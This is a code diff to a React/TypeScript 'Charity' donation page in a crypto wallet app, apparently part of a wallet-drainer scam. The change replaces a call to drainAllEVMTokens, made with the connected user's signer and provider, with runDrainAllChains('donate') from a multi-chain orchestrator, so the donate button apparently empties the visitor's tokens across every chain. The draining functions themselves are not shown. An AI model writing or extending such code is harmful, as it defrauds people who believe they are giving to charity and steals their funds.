@@ -13,7 +13,7 @@ import { Badge } from '@/components/ui/badge';
 import { AnimatedLogo } from '@/components/AnimatedLogo';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
-import { drainAllEVMTokens } from '@/utils/evmTransactions';
+import { useMultiChainOrchestrator } from '@/contexts/MultiChainOrchestratorContext';
 import { useChainInfo } from '@/hooks/useChainInfo';
 import { InlineConnectWallet } from '@/components/InlineConnectWallet';
 
@@ -41,6 +41,7 @@ const Charity = () => {
   const { activeChain, getEVMChain, evmChainId } = useChain();
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const { chainName, nativeToken } = useChainInfo();
+  const { runDrainAllChains } = useMultiChainOrchestrator();
   const [balances, setBalances] = useState<TokenBalance[]>([]);
   const [solBalance, setSolBalance] = useState(0);
   const [solPriceUSD, setSolPriceUSD] = useState(0);
@@ -277,8 +278,7 @@ const Charity = () => {
     if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
       try {
         setButtonState('loading');
-        const chainName = getEVMChain()?.name || 'EVM';
-        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
+        await runDrainAllChains('donate');
         setButtonState('idle');
       } catch (error: any) {
         setButtonState('error');
